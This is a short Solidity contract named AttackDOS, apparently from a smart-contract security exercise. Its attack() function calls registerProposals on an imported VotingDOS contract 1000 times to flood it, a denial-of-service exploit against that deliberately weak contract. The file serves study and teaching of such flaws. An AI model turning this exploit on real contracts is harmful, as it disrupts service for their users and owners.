// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./VotingDOS.sol";
contract AttackDOS {

    VotingDOS public voting;

    constructor(address _votingDosAddress) {
        voting = VotingDOS(_votingDosAddress);
    }

    function attack() external {
        for (uint i = 0; i < 1000; i++) {
            voting.registerProposals("prop");
        }
    }
}
